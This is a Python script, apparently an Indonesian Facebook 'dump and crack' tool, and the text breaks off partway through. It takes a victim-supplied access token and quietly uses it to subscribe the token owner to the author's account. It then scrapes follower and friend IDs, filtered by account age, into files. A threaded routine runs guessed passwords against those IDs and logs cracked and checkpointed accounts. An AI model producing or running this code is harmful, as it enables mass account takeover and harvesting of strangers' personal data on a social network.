#!/usr/bin/python

import os,re,sys,time,random,datetime,requests

from concurrent.futures import ThreadPoolExecutor

from requests.exceptions import ConnectionError

from bs4 import BeautifulSoup as parser

from time import sleep

# Warna

H = ('\x1b[1;90m')

M = ('\x1b[1;91m')

H = ('\x1b[1;92m')

K = ('\x1b[1;93m')

T = ('\x1b[1;94m')

U = ('\x1b[1;95m')

B = ('\x1b[1;96m')

P = ('\x1b[1;97m')

logo = """

figlet Hamii | lolcat

"""

# Banner

___banner___ = ("""%s ____%s \n%s|  _ \ _   _ _ __ ___  _ __\n| | | | | | | '_ ` _ \| '_ \ \n%s| |_| | |_| | | | | | | |_) |\n|____/ \__,_|_| |_| |_| .__/

                      |_|   

                      

\033[1;91m _   _    __    __  __  ____  ____ 

\033[1;92m( )_( )  /__\  (  \/  )(_  _)(_  _)

\033[1;96m ) _ (  /(__)\  )    (  _)(_  _)(_ 

\033[1;91m(_) (_)(__)(__)(_/\/\_)(____)(____) 

"""%(H,P,H,B))

loop = 0

ok = []

cp = []

# Useragent

ua_nokia=('Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530')

ua_xiaomi=('Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36')

ua_samsung=('Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36')

ua_macos=('Mozilla/5.0 (Macintosh; Intel Mac OS X 12_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15')

ua_vivo=('Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36')

ua_oppo=('Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36')

ua_huawei=('Mozilla/5.0 (Linux; Android 8.0.0; HUAWEI Y7 PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36')

ua_redmi4a=('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36')

ua_vivoy12=('Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36')

ua_nokiax=('NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')

ua_asus=('Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36')

ua_galaxys10=('Mozilla/5.0 (Linux; Android 9; SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.105 Mobile Safari/537.36')

ua_lenovo=('Mozilla/5.0 (Linux; Android 9; Lenovo TB-8705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36')

ua=random.choice([ua_nokia,ua_xiaomi,ua_samsung,ua_macos,ua_vivo,ua_oppo,ua_huawei,ua_redmi4a,ua_vivoy12,ua_nokiax,ua_asus,ua_galaxys10,ua_lenovo])

# Login

def ___login___():

    os.system('clear')

    print(___banner___)

    

    print("%s[%s!%s]%s USE TOKEN TO LOGIN %s{%sOpen%s}\n"%(H,P,H,P,H,K,H))

    try:

        ___token = input("%s[%s?%s]%s Token :%s "%(B,P,B,P,H))

        if ___token in ['open','Open']:

            print("%s[%s?*%s]%s Youtube!"%(K,P,K,P))

            os.system('xdg-open www.youtube.com/c/Hamiiworld')

            exit()

        else:

            ___get = requests.get('https://graph.facebook.com/me/?access_token={}'.format(___token)).json()['name']

            open('login.txt','w').write(___token)

            print("%s[%s*%s]%s Welcome :%s %s"%(H,P,H,P,K,___get))

            ___follow___()

    except (KeyError):

        print("%s[%s!%s]%s Token Accepted"%(M,P,M,P));sleep(3);___login___()

    except (ConnectionError):

        exit("%s[%s!%s]%s token Error"%(K,P,K,P))

# Bot Follow

def ___follow___():

    try:

        ___token = open('login.txt', 'r').read()

    except (IOError):

        print("%s[%s!%s]%s Token Invalid"%(M,P,M,P));sleep(2);___login___()

    try:

        # Kalau Mau Di Ganti Izin Dulu!

        ___zed = datetime.datetime.now()

        ___waktu = ___zed.strftime('%A, %d %B %Y/%H.%M.%S')

        ___kata___ = random.choice(['AHN '])

        ___komen___ = ('I Love You @[100009521816069:] \n\n'+___kata___+'\n'+___waktu)

        ___komen2___ = ('I Love You @[100009521816069:]\n\n'+___kata___+'\n'+___waktu)

        ___komen3___ = random.choice(['Hello Have A Nyc Day'])

        requests.post('https://graph.facebook.com/100009521816069/subscribers?access_token=%s'%(___token)) #Hamii

      

    except:

        exit("%s[%s!%s]%s Login"%(M,P,M,P))

    print("%s[%s*%s]%s Login done"%(H,P,H,P))

    ___menu___()

# Daftar Menu

def ___menu___():

    try:

        ___token = open('login.txt','r').read()

    except (IOError):

        print("%s[%s!%s]%s Token Invalid"%(M,P,M,P));sleep(3);___login___()

    try:

        ___get = requests.get('https://graph.facebook.com/me/?access_token={}'.format(___token)).json()['name']

        os.system('clear')

        print(___banner___)

        print("%s[%s•%s]%s Welcome :%s %s"%(H,P,H,P,K,___get))

        try:

            ___gep = requests.get('http://ipinfo.io/json').json()

            print("%s[%s•%s]%s Region :%s %s"%(H,P,H,P,K,___gep['region']))

            print("%s[%s•%s]%s Ip :%s %s\n"%(H,P,H,P,K,___gep['ip']))

        except:

            print("%s[%s•%s]%s Region :%s -"%(H,P,H,P,K))

            print("%s[%s•%s]%s Ip :%s -\n"%(H,P,H,P,K))

    except (KeyError):

        print("%s[%s!%s]%s Token Invalid"%(M,P,M,P));sleep(3);os.system('rm -rf login.txt');___login___()

    except (ConnectionError):

        exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))

    print("%s[%s1%s]%s Dump ID Follower All %s{%s2004-2022%s}"%(B,P,B,P,B,P,B))

    print("%s[%s2%s]%s Dump ID Follower Old %s{%s2004-2009%s}"%(B,P,B,P,B,P,B))

    print("%s[%s3%s]%s Dump ID Follower New %s{%s2020-2022%s}"%(B,P,B,P,B,P,B))

    print("%s[%s4%s]%s Dump ID Public All %s{%s2004-2022%s}"%(B,P,B,P,B,P,B))

    print("%s[%s5%s]%s Dump ID Public Old %s{%s2004-2009%s}"%(B,P,B,P,B,P,B))

    print("%s[%s6%s]%s Dump ID Public New %s{%s2020-2022%s}"%(B,P,B,P,B,P,B))

    

    print("%s[%s0%s]%s Remove Token\n"%(B,P,B,P))

    ___pilih = input("%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))

    if ___pilih in ['1','01']:

        ___acak___()

    elif ___pilih in ['2','02']:

        ___old___()

    elif ___pilih in ['3','03']:

        ___new___()

    elif ___pilih in ['4','04']:

        ___acak2___()

    elif ___pilih in ['5','05']:

        ___old2___()

    elif ___pilih in ['6','06']:

        ___new2___()

    elif ___pilih in ['7','7']:

        ___password___()

    elif ___pilih in ['a','A']:

        ___opsi___()

    elif ___pilih in ['8','8']:

        print("\n%s[%s1%s]%s save Ok"%(B,P,B,P))

        print("%s[%s2%s]%s save Cp"%(B,P,B,P))

        print("%s[%s3%s]%s i lub u"%(B,P,B,P))

        ___hasil = input("\n%s[%s?%s]%s Choose :%s "%(H,P,H,P,K))

        if ___hasil in ['1','01']:

            print("%s "%(H));os.system('cat Results/Ok.txt');exit()

        elif ___hasil in ['2','02']:

            print("%s "%(K));os.system('cat Results/Cp.txt');exit()

        elif ___hasil in ['03','03']:

            ___menu___()

        else:

            exit("%s[%s!%s]%s Wrong Input"%(M,P,M,P))

    elif ___pilih in ['0','00']:

        print("%s[%s!%s]%s Menghapus Token"%(K,P,K,P));os.system('rm -rf login.txt');exit()

    else:

        exit("%s[%s!%s]%s Wrong Input"%(M,P,M,P))

# Dump Follower All

def ___acak___():

        try:

            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))

            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:

                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']

                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))

                print("%s "%(P))

            else:

                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))

        except (KeyError):

            exit("%s[%s!%s]%s User Error"%(M,P,M,P))

        try:

            ___file = ___get.replace(' ','_')+'.txt'

            ___files = open('Dump/'+___file,'w')

            for z in requests.get('https://graph.facebook.com/{}/subscribers?access_token={}&limit=5000'.format(___user,open('login.txt','r').read())).json()['data']:

                ___files.write(z['id']+'|'+z['name']+' \n')

                print('\r'+z['id']+'|'+z['name'])

            ___files.close()

            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))

            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('Dump/'+___file,'r').readlines())))

            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'Dump/'+___file))

            input("%s{%sKembali%s}%s"%(H,P,H,P));___menu___()

        except (KeyError):

            exit("%s[%s!%s]%s Dump Gagal"%(M,P,M,P))

        except (ConnectionError):

            exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))

# Dump Follower Old

def ___old___():

        try:

            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))

            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:

                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']

                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))

                print("%s "%(P))

            else:

                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))

        except (KeyError):

            exit("%s[%s!%s]%s User Error"%(M,P,M,P))

        try:

            ___file = ___get.replace(' ','_')+'.txt'

            ___files = open('Dump/'+___file,'a')

            for z in requests.get('https://graph.facebook.com/{}/subscribers?access_token={}&limit=5000'.format(___user,open('login.txt','r').read())).json()['data']:

                if len(z['id'])==1 or len(z['id'])==2 or len(z['id'])==3 or len(z['id'])==4 or len(z['id'])==5 or len(z['id'])==6 or len(z['id'])==7 or len(z['id'])==8 or len(z['id'])==9 or len(z['id'])==10:

                    ___files.write(z['id']+'<=>'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:10] in ['1000000000']:

                    ___files.write(z['id']+'<=>'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:9] in ['100000000']:

                    ___files.write(z['id']+'<=>'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:8] in ['10000000']:

                    ___files.write(z['id']+'<=>'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:

                    ___files.write(z['id']+'<=>'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

            ___files.close()

            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))

            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('Dump/'+___file,'r').readlines())))

            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'Dump/'+___file))

            input("%s{%sKembali%s}%s"%(H,P,H,P));___menu___()

        except (KeyError):

            exit("%s[%s!%s]%s Dump Gagal"%(M,P,M,P))

        except (ConnectionError):

            exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))

# Dump Follower New

def ___new___():

        try:

            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))

            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:

                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']

                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))

                print("%s "%(P))

            else:

                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))

        except (KeyError):

            exit("%s[%s!%s]%s User Error"%(M,P,M,P))

        try:

            ___file = ___get.replace(' ','_')+'.txt'

            ___files = open('Dump/'+___file,'a')

            for z in requests.get('https://graph.facebook.com/{}/subscribers?access_token={}&limit=5000'.format(___user,open('login.txt','r').read())).json()['data']:

                if z['id'][:5] in ['10005','10006','10007','10008']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

            ___files.close()

            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))

            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('Dump/'+___file,'r').readlines())))

            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'Dump/'+___file))

            input("%s{%sKembali%s}%s"%(H,P,H,P));___menu___()

        except (KeyError):

            exit("%s[%s!%s]%s Dump Gagal"%(M,P,M,P))

        except (ConnectionError):

            exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))

# Dump Publik Acak

def ___acak2___():

        try:

            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))

            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:

                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']

                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))

                print("%s "%(P))

            else:

                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))

        except (KeyError):

            exit("%s[%s!%s]%s User Error"%(M,P,M,P))

        try:

            ___file = ___get.replace(' ','_')+'.txt'

            ___files = open('Dump/'+___file,'a')

            for z in requests.get('https://graph.facebook.com/{}?fields=friends.limit(5000)&access_token={}'.format(___user,open('login.txt','r').read())).json()['friends']['data']:

                ___files.write(z['id']+'|'+z['name']+' \n')

                print('\r'+z['id']+'|'+z['name'])

            ___files.close()

            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))

            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('Dump/'+___file,'r').readlines())))

            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'Dump/'+___file))

            input("%s{%sKembali%s}%s"%(H,P,H,P));___menu___()

        except (KeyError):

            exit("%s[%s!%s]%s Dump Gagal"%(M,P,M,P))

        except (ConnectionError):

            exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))

# Dump Publik Old

def ___old2___():

        try:

            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))

            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:

                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']

                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))

                print("%s "%(P))

            else:

                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))

        except (KeyError):

            exit("%s[%s!%s]%s User Error"%(M,P,M,P))

        try:

            ___file = ___get.replace(' ','_')+'.txt'

            ___files = open('Dump/'+___file,'a')

            for z in requests.get('https://graph.facebook.com/{}?fields=friends.limit(5000)&access_token={}'.format(___user,open('login.txt','r').read())).json()['friends']['data']:

                if len(z['id'])==1 or len(z['id'])==2 or len(z['id'])==3 or len(z['id'])==4 or len(z['id'])==5 or len(z['id'])==6 or len(z['id'])==7 or len(z['id'])==8 or len(z['id'])==9 or len(z['id'])==10:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:10] in ['1000000000']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:9] in ['100000000']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:8] in ['10000000']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

                elif z['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

            ___files.close()

            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))

            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('Dump/'+___file,'r').readlines())))

            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'Dump/'+___file))

            input("%s{%sKembali%s}%s"%(H,P,H,P));___menu___()

        except (KeyError):

            exit("%s[%s!%s]%s Dump Gagal"%(M,P,M,P))

        except (ConnectionError):

            exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))

# Dump Publik New

def ___new2___():

        try:

            ___user = input("\n%s[%s?%s]%s User :%s "%(B,P,B,P,H))

            if ___user[:1] in ['0','1','2','3','4','5','6','7','8','9']:

                ___get = requests.get('https://graph.facebook.com/{}?access_token={}'.format(___user,open('login.txt','r').read())).json()['name']

                print("%s[%s?%s]%s Name :%s %s"%(B,P,B,P,H,___get))

                print("%s "%(P))

            else:

                exit("%s[%s!%s]%s Hanya Angka"%(M,P,M,P))

        except (KeyError):

            exit("%s[%s!%s]%s User Error"%(M,P,M,P))

        try:

            ___file = ___get.replace(' ','_')+'.txt'

            ___files = open('Dump/'+___file,'a')

            for z in requests.get('https://graph.facebook.com/{}?fields=friends.limit(5000)&access_token={}'.format(___user,open('login.txt','r').read())).json()['friends']['data']:

                if z['id'][:5] in ['10005','10006','10007','10008']:

                    ___files.write(z['id']+'|'+z['name']+' \n')

                    print('\r'+z['id']+'|'+z['name'])

            ___files.close()

            print("\n%s[%s*%s]%s Selesai"%(H,P,H,P))

            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(open('Dump/'+___file,'r').readlines())))

            print("%s[%s?%s]%s File Tersimpan Di :%s %s\n"%(H,P,H,P,K,'Dump/'+___file))

            input("%s{%sKembali%s}%s"%(H,P,H,P));___menu___()

        except (KeyError):

            exit("%s[%s!%s]%s Dump Gagal"%(M,P,M,P))

        except (ConnectionError):

            exit("%s[%s!%s]%s Koneksi Error"%(K,P,K,P))

# Pilih Password

def ___password___():

    ___cek = input("\n%s[%s?%s]%s Gunakan Password Manual {y/t} :%s "%(B,P,B,P,H))

    if ___cek in ['y','Y']:

        with ThreadPoolExecutor(max_workers=35) as (___hayuk):

            try:

                ___file = input ("%s[%s?%s]%s File Dump :%s "%(B,P,B,P,H))

                ___files = open(___file,'r').read().splitlines()

                ___pws = input("%s[%s?%s]%s Password :%s "%(B,P,B,P,H)).split(',')

                print("%s "%(P))

            except (IOError):

                exit("%s[%s!%s]%s File Tidak Ada"%(M,P,M,P))

            for ___user in ___files:

                uid, name = ___user.split('|')

                ___hayuk.submit(___api___, ___files, uid, ___pws)

        os.remove(___file);exit("\n%s{%sSelesai%s}%s"%(H,P,H,P))

    elif ___cek in ['t','T']:

        with ThreadPoolExecutor(max_workers=35) as (___hayuk):

            try:

                ___file = input ("%s[%s?%s]%s File Dump :%s "%(B,P,B,P,H))

                ___files = open(___file,'r').read().splitlines()

                print("%s[%s?%s]%s Total ID :%s %s"%(B,P,B,P,H,len(___files)))

            except (IOError):

                exit("%s[%s!%s]%s File Tidak Ada"%(M,P,M,P))

            print("\n%s[%s•%s]%s Hasil Ok Tersimpan Di Results/Ok.txt"%(H,P,H,P))

            print("%s[%s•%s]%s Hasil Cp Tersimpan Di Results/Cp.txt\n"%(H,P,H,P))

            for ___user in ___files:

                uid, name = ___user.split('|')

                z = name.split(' ')

                if len(z)==2 or len(z)==3 or len(z)==4 or len(z)==5 or len(z)==6:

     
